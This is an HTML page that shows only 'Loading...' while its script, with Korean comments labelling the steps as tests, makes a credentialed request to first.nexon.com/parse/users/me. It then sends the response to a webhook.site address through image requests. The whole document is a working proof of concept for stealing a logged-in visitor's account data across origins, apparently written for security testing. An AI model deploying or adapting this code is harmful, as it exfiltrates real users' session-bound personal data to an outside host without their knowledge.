<html>
<body>
<h3>Loading...</h3>
<div id="result"></div>
<script>
var webhook = 'https://webhook.site/ef466442-7cf1-4535-a8c3-05888ba975f1';

// 테스트 1: JS 실행 확인
new Image().src = webhook + '?js_exec=true';

// 테스트 2: first.nexon.com API 호출 시도
fetch('https://first.nexon.com/parse/users/me', {
  credentials: 'include'
})
.then(function(r) { return r.text(); })
.then(function(d) {
  new Image().src = webhook + '?api_response=' + encodeURIComponent(d.substring(0, 500));
  document.getElementById('result').innerText = d;
})
.catch(function(e) {
  new Image().src = webhook + '?api_error=' + encodeURIComponent(e.toString());
  document.getElementById('result').innerText = 'Error: ' + e;
});
</script>
</body>
</html>
